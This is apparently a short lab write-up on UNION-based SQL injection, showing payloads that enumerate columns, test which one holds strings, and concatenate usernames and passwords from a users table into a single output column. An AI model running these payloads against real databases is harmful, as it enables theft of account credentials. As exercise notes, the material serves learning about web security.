# Multiple values in single column

we can retrieve multiple values together within this single column by concatenating their values

query

```sql
' union select username || '~' || password from users--
```

here || indicates the concatenation operator on Orcale and ~ indicates seperated by

end goal : Multiple value in single column

running query directly gave us internal error

let's try to figure  out the columns

```sql
' order by 1--
' order by 2--
```

 here we have two columns lets check if it conatins string or not

```sql
' union select 'a',NULL from users-- //this query return error so it doesn't have string

' union select NULL, 'a' from users-- //gave us output
```

After this analysis our payload should be

payload

```sql
' union select NULL, username ||'~'|| password from users--
```

Got all the desired output
